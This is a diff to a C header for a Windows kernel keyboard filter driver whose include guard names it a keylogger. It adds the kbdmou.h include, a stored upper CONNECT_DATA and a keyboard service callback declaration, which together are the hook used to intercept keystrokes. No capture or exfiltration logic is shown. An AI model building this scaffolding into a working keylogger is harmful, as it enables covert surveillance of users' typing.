@@ -4,6 +4,8 @@
 #define NTSTRSAFE_LIB
 #include <ntstrsafe.h>
 
+#include <kbdmou.h>
+
 #ifndef KEYLOGGER_FILTER_H
 #define KEYLOGGER_FILTER_H
 
@@ -22,6 +24,11 @@ typedef struct _FILTER_EXTENSION
     WDFDEVICE WdfDevice;
     // More context data here
 
+    //
+    // The real connect data that this driver reports to
+    //
+    CONNECT_DATA UpperConnectData;
+
 }FILTER_EXTENSION, * PFILTER_EXTENSION;
 
 
@@ -30,6 +37,14 @@ WDF_DECLARE_CONTEXT_TYPE_WITH_NAME(FILTER_EXTENSION, FilterGetData)
 DRIVER_INITIALIZE DriverEntry;
 EVT_WDF_DRIVER_DEVICE_ADD FilterEvtDeviceAdd;
 EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL FilterEvtIoInternalDeviceControl;
+
+VOID
+FilterServiceCallback(
+    IN PDEVICE_OBJECT DeviceObject,
+    IN PKEYBOARD_INPUT_DATA InputDataStart,
+    IN PKEYBOARD_INPUT_DATA InputDataEnd,
+    IN OUT PULONG InputDataConsumed
+);
 
 VOID
 FilterForwardRequest(
